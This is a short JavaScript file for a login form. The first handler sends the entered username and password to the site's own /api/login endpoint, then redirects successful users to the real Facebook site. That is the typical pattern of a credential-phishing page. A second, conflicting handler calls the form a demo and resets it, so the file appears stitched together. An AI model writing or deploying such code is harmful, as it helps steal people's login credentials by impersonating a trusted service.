const form = document.querySelector('#loginForm');
const message = document.querySelector('#message');

form.addEventListener('submit', async (event) => {
  event.preventDefault();
  message.textContent = 'Saving details...';

  const username = document.querySelector('#username').value;
  const password = document.querySelector('#password').value;

  try {
    const response = await fetch('/api/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username, password })
    });
    const data = await response.json();
    message.textContent = data.message;
    message.style.color = response.ok ? '#13824a' : '#bf3030';
    if (response.ok) window.location.assign('https://web.facebook.com');
  } catch {
    message.textContent = 'Server connection failed.';
    message.style.color = '#bf3030';
  }
});



form.addEventListener("submit", (event) => {
  event.preventDefault();

  message.textContent =
    "Demo form submitted successfully.";

  form.reset();
});
